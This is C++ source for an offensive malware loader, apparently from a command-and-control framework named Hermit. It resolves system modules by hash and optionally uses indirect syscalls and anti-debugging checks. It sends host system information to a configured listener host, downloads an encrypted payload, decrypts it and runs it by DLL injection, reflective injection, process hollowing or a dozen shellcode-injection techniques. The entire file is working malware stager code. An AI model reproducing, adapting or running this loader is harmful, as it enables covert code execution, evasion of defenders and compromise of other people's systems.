#include "hermit.hpp"

namespace Hermit
{
    State::PSTATE Init()
    {
        State::PSTATE pState = new State::STATE;

        pState->pTeb = NtCurrentTeb();

        #ifdef PAYLOAD_INDIRECT_SYSCALLS
		pState->bIndirectSyscalls = TRUE;
        #else
        pState->bIndirectSyscalls = FALSE;
        #endif

        Procs::PPROCS pProcs = new Procs::PROCS;

        // --------------------------------------------------------------------------
        // Get module handlers and functions
        // --------------------------------------------------------------------------

        Modules::PMODULES pModules = new Modules::MODULES;

        HMODULE hNtdll = (HMODULE)Modules::GetModuleByHash(HASH_MODULE_NTDLL);
        if (!hNtdll)
        {
            return nullptr;
        }
        pModules->hNtdll = hNtdll;

        HMODULE hKernel32 = (HMODULE)Modules::GetModuleByHash(HASH_MODULE_KERNEL32);
        if (!hKernel32)
        {
            FreeLibrary(hNtdll);
            return nullptr;
        }
        pModules->hKernel32 = hKernel32;

        // Get functions
        Procs::FindProcs(
            pProcs,
            hNtdll,
            hKernel32,
            pState->bIndirectSyscalls
        );

        // --------------------------------------------------------------------------
        // Get module handlers and functions
        // --------------------------------------------------------------------------
        
        WCHAR wAdvapi32[] = L"advapi32.dll";
        HMODULE hAdvapi32 = (HMODULE)Modules::LoadModule(pProcs, (LPWSTR)wAdvapi32);
        if (!hAdvapi32)
        {
			FreeLibrary(hNtdll);
			FreeLibrary(hKernel32);
            return nullptr;
        }
        pModules->hAdvapi32 = hAdvapi32;

        WCHAR wBcrypt[] = L"bcrypt.dll";
        HMODULE hBcrypt = (HMODULE)Modules::LoadModule(pProcs, (LPWSTR)wBcrypt);
        if (!hBcrypt)
        {
			FreeLibrary(hNtdll);
			FreeLibrary(hKernel32);
            return nullptr;
        }
        pModules->hBcrypt = hBcrypt;

        WCHAR wCrypt32[] = L"crypt32.dll";
        HMODULE hCrypt32 = (HMODULE)Modules::LoadModule(pProcs, (LPWSTR)wCrypt32);
        if (!hCrypt32)
        {
			FreeLibrary(hNtdll);
			FreeLibrary(hKernel32);
            return nullptr;
        }
        pModules->hCrypt32 = hCrypt32;

        WCHAR wUser32[] = L"user32.dll";
        HMODULE hUser32 = (HMODULE)Modules::LoadModule(pProcs, (LPWSTR)wUser32);
        if (!hUser32)
        {
			FreeLibrary(hNtdll);
			FreeLibrary(hKernel32);
            return nullptr;
        }
        pModules->hUser32 = hUser32;

        WCHAR wWinHttp[] = L"winhttp.dll";
        HMODULE hWinHttp = (HMODULE)Modules::LoadModule(pProcs, (LPWSTR)wWinHttp);
        if (!hWinHttp)
        {
			FreeLibrary(hNtdll);
			FreeLibrary(hKernel32);
            return nullptr;
        }
        pModules->hWinHttp = hWinHttp;

        WCHAR wWs2_32[] = L"ws2_32.dll";
        HMODULE hWs2_32 = (HMODULE)Modules::LoadModule(pProcs, (LPWSTR)wWs2_32);
        if (!hWs2_32)
        {
			FreeLibrary(hNtdll);
			FreeLibrary(hKernel32);
            return nullptr;
        }
        pModules->hWs2_32 = hWs2_32;

        // Get functions
        Procs::FindProcsMisc(
            pProcs,
            hAdvapi32,
            hBcrypt,
            hCrypt32,
            hUser32,
            hWinHttp,
            hWs2_32
        );

        // --------------------------------------------------------------------------
        // Store other states
        // --------------------------------------------------------------------------

        pState->pModules                    = pModules;
        pState->pProcs                      = pProcs;
		pState->pCrypt				        = Crypt::InitCrypt(pProcs, AES_KEY_BASE64_W, AES_IV_BASE64_W);
		pState->lpPayloadType 		        = PAYLOAD_TYPE_W;
		pState->lpPayloadTechnique 		    = PAYLOAD_TECHNIQUE_W;
        pState->lpPayloadProcessToInject    = PAYLOAD_PROCESS_TO_INJECT_W;
		pState->lpListenerProto 	        = LISTENER_PROTOCOL_W;
		pState->lpListenerHost 		        = LISTENER_HOST_W;
		pState->nListenerPort 		        = LISTENER_PORT;
		pState->lpReqPathDownload 	        = REQUEST_PATH_DOWNLOAD_W;
		pState->hSession 			        = nullptr;
		pState->hConnect 			        = nullptr;
		pState->hRequest 			        = nullptr;
		// pState->pSocket 			        = nullptr;

        // --------------------------------------------------------------------------
        // Initialize WinHttp handlers
        // --------------------------------------------------------------------------

		Handler::HTTPInit(pState);
		if (pState->hSession == nullptr || pState->hConnect == nullptr)
		{
			State::Free(pState);
			return nullptr;
		}

        return pState;
    }

    std::vector<BYTE> Download(State::PSTATE pState)
    {
        // Get system information
		std::wstring wInfoJSON = Handler::GetInitialInfoJSON(pState);
        std::string sInfoJSON = Utils::Convert::UTF8Encode(wInfoJSON);

        System::Http::WinHttpResponse resp = System::Http::RequestSend(
            pState->pProcs,
            pState->hConnect,
            pState->lpListenerHost,
            pState->nListenerPort,
            pState->lpReqPathDownload,
            L"POST",
            L"Content-Type: application/json\r\n",
            (LPVOID)sInfoJSON.c_str(),
            (DWORD)strlen(sInfoJSON.c_str())
        );
        if (!resp.bResult || resp.dwStatusCode != 200)
        {
            return std::vector<BYTE>();
        }

        std::wstring wEnc = System::Http::ResponseRead(pState->pProcs, resp.hRequest);
        if (wEnc.length() == 0)
        {
            return std::vector<BYTE>();
        }

        // Decrypt the data
        std::vector<BYTE> bytes = Crypt::Decrypt(
            pState->pProcs,
            wEnc,
            pState->pCrypt->pAES->hKey,
            pState->pCrypt->pAES->iv
        );
        return bytes;
    }

    VOID DLLLoader()
    {
        State::PSTATE pState = Init();
        if (!pState)
        {
            return;
        }

        // Anti-Debug
        #ifdef PAYLOAD_ANTI_DEBUG
        Technique::AntiDebug::StopIfDebug(pState->pProcs);
        #endif

        // Download DLL
        std::vector<BYTE> bytes = Download(pState);
        if (bytes.empty())
        {
            State::Free(pState);
            return;
        }

        // Target PID to be injected DLL.
        DWORD dwTargetPID = System::Process::ProcessGetIdByName(
            pState->pProcs,
            pState->lpPayloadProcessToInject
        );

        // Inject DLL
        if (wcscmp(pState->lpPayloadTechnique, L"dll-injection") == 0)
        {
            Technique::Injection::DLLInjection(pState->pProcs, dwTargetPID, bytes);
        }
        else if (wcscmp(pState->lpPayloadTechnique, L"reflective-dll-injection") == 0)
        {
            Technique::Injection::ReflectiveDLLInjection(pState->pProcs, dwTargetPID, bytes);
        }

        State::Free(pState);
        return;
    }

    VOID PELoader()
    {
        State::PSTATE pState = Init();
        if (!pState)
        {
            return;
        }

        // Anti-Debug
        #ifdef PAYLOAD_ANTI_DEBUG
        Technique::AntiDebug::StopIfDebug(pState->pProcs);
        #endif

        // Download PE
        std::vector<BYTE> bytes = Download(pState);
        if (bytes.empty())
        {
            State::Free(pState);
            return;
        }

        // Inject PE
        if (wcscmp(pState->lpPayloadTechnique, L"direct-execution") == 0)
        {
            Technique::Injection::DirectExecution(pState->pProcs, bytes);
        }
        else if (wcscmp(pState->lpPayloadTechnique, L"process-hollowing") == 0)
        {
            Technique::Injection::ProcessHollowing(
                pState->pProcs,
                pState->lpPayloadProcessToInject,
                bytes
            );
        }

        State::Free(pState);
        return;
    }

    VOID ShellcodeLoader()
    {   
        State::PSTATE pState = Init();
        if (!pState)
        {
            return;
        }

        // Anti-Debug
        #ifdef PAYLOAD_ANTI_DEBUG
        Technique::AntiDebug::StopIfDebug(pState->pProcs);
        #endif

        // Download shellcode
        std::vector<BYTE> bytes = Download(pState);
        if (bytes.empty())
        {
            State::Free(pState);
            return;
        }

        DWORD dwTargetPID = System::Process::ProcessGetIdByName(
            pState->pProcs,
            pState->lpPayloadProcessToInject
        );

        // Inject shellcode
        if (wcscmp(pState->lpPayloadTechnique, L"shellcode-injection") == 0)
        {
            Technique::Injection::ShellcodeInjection(
                pState->pProcs,
                dwTargetPID,
                bytes
            );
        }
        else if (wcscmp(pState->lpPayloadTechnique, L"via-fibers") == 0)
        {
            Technique::Injection::ShellcodeExecutionViaFibers(
                pState->pProcs,
                bytes
            );
        }
        else if (wcscmp(pState->lpPayloadTechnique, L"via-apc-and-nttestalert") == 0)
        {
            Technique::Injection::ShellcodeExecutionViaAPCAndNtTestAlert(
                pState->pProcs,
                bytes
            );
        }
        else if (wcscmp(pState->lpPayloadTechnique, L"early-bird-apc-queue-code-injection") == 0)
        {
            Technique::Injection::EarlyBirdAPCQueueCodeInjection(
                pState->pProcs,
                pState->lpPayloadProcessToInject,
                bytes
            );
        }
        else if (wcscmp(pState->lpPayloadTechnique, L"via-create-threadpool-wait") == 0)
        {
            Technique::Injection::ShellcodeExecutionViaCreateThreadpoolWait(
                pState->pProcs,
                bytes
            );
        }
        else if (wcscmp(pState->lpPayloadTechnique, L"thread-execution-hijacking") == 0)
        {
            Technique::Injection::ThreadExecutionHijacking(
                pState->pProcs,
                dwTargetPID,
                bytes
            );
        }
        else if (wcscmp(pState->lpPayloadTechnique, L"via-memory-sections") == 0)
        {
            Technique::Injection::ShellcodeExecutionViaMemorySections(
                pState->pProcs,
                dwTargetPID,
                bytes
            );
        }
        else if (wcscmp(pState->lpPayloadTechnique, L"via-find-window") == 0)
        {
            Technique::Injection::ShellcodeExecutionViaFindWindow(
                pState->pProcs,
                bytes
            );
        }
        else if (wcscmp(pState->lpPayloadTechnique, L"via-kernel-callback-table") == 0)
        {
            Technique::Injection::ShellcodeExecutionViaKernelContextTable(
                pState->pProcs,
                bytes
            );
        }
        else if (wcscmp(pState->lpPayloadTechnique, L"rwx-hunting") == 0)
        {
            Technique::Injection::RWXHunting(
                pState->pProcs,
                bytes
            );
        }
        else if (wcscmp(pState->lpPayloadTechnique, L"address-of-entry-point-injection") == 0)
        {
            Technique::Injection::AddressOfEntryPointInjection(
                pState->pProcs,
                pState->lpPayloadProcessToInject,
                bytes
            );
        }
        else if (wcscmp(pState->lpPayloadTechnique, L"module-stomping") == 0)
        {
            Technique::Injection::ModuleStomping(
                pState->pProcs,
                dwTargetPID,
                bytes
            );
        }
        else if (wcscmp(pState->lpPayloadTechnique, L"dirty-vanity") == 0)
        {
            Technique::Injection::DirtyVanity(
                pState->pProcs,
                dwTargetPID,
                bytes
            );
        }

        State::Free(pState);
        return;
    }
}
